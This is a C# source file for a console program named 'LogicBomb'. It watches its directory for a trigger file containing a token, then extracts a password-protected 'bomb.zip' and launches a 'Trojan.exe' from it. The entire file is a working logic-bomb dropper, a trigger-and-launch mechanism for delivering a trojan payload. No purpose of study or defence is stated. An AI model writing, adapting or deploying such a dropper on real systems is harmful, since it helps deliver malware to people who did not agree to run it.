using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Ionic.Zip;

namespace LogicBomb
{
    internal class Program
    {
        private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");

        private const string TriggerName = "trigger.flag";
        private const string RequiredToken = "ALLOW_TRIGGER";
        private const string MarkerName = "activated.txt";

        private const int DebounceMs = 1000;
        private const int FileReadyTimeoutSec = 5;

        private static FileSystemWatcher watcher;
        private static ConcurrentDictionary<string, DateTime> pending = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);
        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static string logFile;

        static void Main(string[] args)
        {
            Console.WriteLine("[LogicBomb] START (Simplified Mode) - Press Ctrl+C to stop");

            // ✅ Ensure result directory exists
            Directory.CreateDirectory(ResultDir);
            logFile = Path.Combine(ResultDir, "logicbomb_simplified_log.jsonl");

            watcher = new FileSystemWatcher(ExecutableBaseDir)
            {
                NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.CreationTime | NotifyFilters.Size,
                Filter = "*.*",
                IncludeSubdirectories = false,
                EnableRaisingEvents = true
            };

            watcher.Created += (s, e) => Enqueue(e.FullPath, "Created");
            watcher.Changed += (s, e) => Enqueue(e.FullPath, "Changed");
            watcher.Renamed += (s, e) => Enqueue(e.FullPath, "Renamed");

            Console.CancelKeyPress += (s, e) =>
            {
                Console.WriteLine("[LogicBomb] Stopping...");
                e.Cancel = true;
                cts.Cancel();
            };

            var worker = Task.Run(() => ProcessLoop(cts.Token));

            Console.WriteLine($"[LogicBomb] Watching: {ExecutableBaseDir}");
            Console.WriteLine($"[LogicBomb] Waiting for file '{TriggerName}' containing token '{RequiredToken}'");
            worker.Wait();
            Console.WriteLine("[LogicBomb] Exiting.");
        }

        private static void Enqueue(string path, string ev)
        {
            try
            {
                if (!string.Equals(Path.GetFileName(path), TriggerName, StringComparison.OrdinalIgnoreCase))
                    return;

                pending[path] = DateTime.UtcNow;
                LogEvent("enqueue", path, ev, null);
                Console.WriteLine($"[LogicBomb] Event {ev} -> enqueue: {path}");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] Enqueue error: " + ex.Message);
            }
        }

        private static void LogEvent(string type, string path, string ev, string note)
        {
            try
            {
                var obj = new Dictionary<string, string>
                {
                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
                    ["type"] = type,
                    ["event"] = ev ?? "",
                    ["path"] = path ?? "",
                    ["note"] = note ?? ""
                };
                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";
                File.AppendAllText(logFile, json + Environment.NewLine);
            }
            catch { /* non-fatal */ }
        }

        private static string Escape(string s)
        {
            return s?.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n") ?? "";
        }

        private static async Task ProcessLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    var now = DateTime.UtcNow;
                    var ready = pending.Where(kv => (now - kv.Value).TotalMilliseconds >= DebounceMs)
                                       .Select(kv => kv.Key)
                                       .ToArray();
                    foreach (var path in ready)
                    {
                        DateTime removed;
                        pending.TryRemove(path, out removed);
                        await Task.Run(() => HandleTrigger(path));
                    }
                    await Task.Delay(300, token);
                }
            }
            catch (TaskCanceledException) { }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] Worker error: " + ex.Message);
            }
        }

        private static void HandleTrigger(string fullPath)
        {
            try
            {
                Console.WriteLine("[LogicBomb] Processing trigger: " + fullPath);
                LogEvent("process_start", fullPath, "processing", null);

                if (!WaitForFileReady(fullPath, TimeSpan.FromSeconds(FileReadyTimeoutSec)))
                {
                    Console.WriteLine("[LogicBomb] File not ready within timeout: " + fullPath);
                    LogEvent("error", fullPath, "not_ready", "timeout waiting for file ready");
                    return;
                }

                string content = "";
                try { content = File.ReadAllText(fullPath); }
                catch (Exception ex) { Console.WriteLine("[LogicBomb] Error reading trigger: " + ex.Message); }

                if (string.IsNullOrEmpty(content) || content.IndexOf(RequiredToken, StringComparison.OrdinalIgnoreCase) < 0)
                {
                    Console.WriteLine("[LogicBomb] Trigger does not contain a valid token. Skipping.");
                    LogEvent("skipped", fullPath, "invalid_token", null);
                    return;
                }

                // ✅ Marker file inside "result"
                string markerPath = Path.Combine(ResultDir, MarkerName);
                File.WriteAllText(markerPath, $"Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                Console.WriteLine("[LogicBomb] Creating marker: " + markerPath);

                string bombZipPath = Path.Combine(ExecutableBaseDir, "bomb.zip");
                string extractionDir = ResultDir;
                string executableToRun = null;

                if (File.Exists(bombZipPath))
                {
                    try
                    {
                        Console.WriteLine($"[LogicBomb] Found bomb.zip at: {bombZipPath}");
                        using (ZipFile zip = ZipFile.Read(bombZipPath))
                        {
                            zip.Password = "123";
                            foreach (ZipEntry e in zip)
                            {
                                e.Extract(extractionDir, ExtractExistingFileAction.OverwriteSilently);
                            }
                        }
                        Console.WriteLine($"[LogicBomb] Extracted bomb.zip to {extractionDir} with password '123'.");
                        LogEvent("extracted", bombZipPath, "extracted_to", extractionDir);

                        executableToRun = Path.Combine(extractionDir, "Trojan.exe");
                        if (!File.Exists(executableToRun))
                        {
                            Console.WriteLine($"[LogicBomb] Trojan.exe not found after extraction: {executableToRun}");
                            LogEvent("error", extractionDir, "Trojan_exe_not_found", null);
                            executableToRun = null;
                        }
                    }
                    catch (Ionic.Zip.BadPasswordException)
                    {
                        Console.WriteLine("[LogicBomb] Error extracting bomb.zip: Incorrect password.");
                        LogEvent("error", bombZipPath, "extract_failed", "Incorrect password");
                        executableToRun = null;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error extracting bomb.zip: " + ex.Message);
                        LogEvent("error", bombZipPath, "extract_failed", ex.Message);
                        executableToRun = null;
                    }
                }
                else
                {
                    Console.WriteLine($"[LogicBomb] bomb.zip not found in program directory. Skipping extraction.");
                    LogEvent("info", fullPath, "no_bomb_zip", null);
                }

                if (executableToRun != null)
                {
                    Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
                    var psi = new ProcessStartInfo
                    {
                        FileName = executableToRun,
                        WorkingDirectory = extractionDir,
                        UseShellExecute = true,
                        CreateNoWindow = false
                    };

                    try
                    {
                        Process.Start(psi);
                        LogEvent("launched", executableToRun, "launched", null);
                        Console.WriteLine("[LogicBomb] Executable started. Exiting main app.");
                        Environment.Exit(0); // ✅ Immediately exit after launch
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error launching executable: " + ex.Message);
                        LogEvent("error", executableToRun, "launch_failed", ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] HandleTrigger error: " + ex.Message);
                LogEvent("error", fullPath, "handle_error", ex.Message);
            }
        }

        private static bool WaitForFileReady(string path, TimeSpan timeout)
        {
            var sw = Stopwatch.StartNew();
            while (sw.Elapsed < timeout)
            {
                try
                {
                    using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        return true;
                    }
                }
                catch
                {
                    Thread.Sleep(100);
                }
            }
            return false;
        }
    }
}
